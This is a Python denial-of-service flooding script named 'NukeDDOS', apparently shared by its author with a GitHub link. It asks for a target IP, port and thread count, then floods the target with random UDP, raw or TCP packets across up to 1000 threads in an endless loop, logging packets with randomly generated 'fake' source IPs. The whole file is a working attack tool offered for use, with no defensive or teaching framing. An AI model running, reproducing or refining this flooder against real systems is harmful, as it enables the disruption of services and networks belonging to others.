import os
import time
import socket
import random
import threading
import struct
from datetime import datetime

# Packet types for flexibility (convertido para tuple imutável)
PACKET_TYPES = (
    ("UDP", socket.SOCK_DGRAM),
    ("RAW", socket.SOCK_RAW),
    ("ICMP", socket.SOCK_RAW),
    ("TCP", socket.SOCK_STREAM)
)

# Configuration interface (otimizado para uma única chamada de sistema)
os.system("clear && figlet -f slant NukeDDOS")
print("Author   : Laila19\ngithub   : https://github.com/lailacypher\n")
ip = input("Target IP : ").strip()
port = int(input("Port      : ").strip())
threads = int(input("Threads   : ").strip())

# Packet type selection (otimizado com enumerate direto)
print("\nSelect packet type:")
for i, (packet_name, _) in enumerate(PACKET_TYPES, 1):
    print(f"{i}. {packet_name}")
type_choice = int(input("Packet Type (1-4): ").strip()) - 1
packet_name, sock_type = PACKET_TYPES[type_choice]

# Socket setup (pré-alocação de recursos)
sock = socket.socket(socket.AF_INET, sock_type, socket.IPPROTO_UDP if packet_name == "UDP" else 0)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
data = random._urandom(2048)  # Mantido conforme original
sent = 0
lock = threading.Lock()

# Progress bar otimizado (sem sleeps desnecessários)
os.system("clear && figlet Attack Starting")
progress = ["[                    ] 0%", "[=====               ] 25%", 
            "[==========          ] 50%", "[===============     ] 75%", 
            "[====================] 100%"]
print("\n".join(progress))

# Random IP generation (otimizado com geração direta)
def random_ip():
    return socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))

# Função de ataque otimizada (pré-formatado strings e reduzido overhead)
def attack():
    global sent
    target = (ip, port)
    packet_base = data
    local_sock = socket.socket(socket.AF_INET, sock_type, socket.IPPROTO_UDP if packet_name == "UDP" else 0)
    local_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    while True:
        try:
            fake_ip = random_ip()
            # Packet construction otimizado
            packet = packet_base + fake_ip.encode()
            
            # Envio em lote (mais eficiente)
            for _ in range(5):
                local_sock.sendto(packet[:512], target)
                local_sock.sendto(packet[512:1024], target)
                local_sock.sendto(packet[1024:1536], target)
                local_sock.sendto(packet[1536:], target)
            
            # Atualização de contagem thread-safe
            with lock:
                sent += 5
                if sent % 100 == 0:  # Reduz frequência de logs
                    print(f"Packets {sent} sent to {ip}:{port} from {fake_ip}")
                    
        except Exception as e:
            print(f"Error: {str(e)[:50]}")  # Log reduzido

# Thread pool otimizado
threads = min(threads, 1000)  # Previne overload
for _ in range(threads):
    thread = threading.Thread(target=attack, daemon=True)
    thread.start()

# Mantém threads ativas
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\nAttack stopped by user")
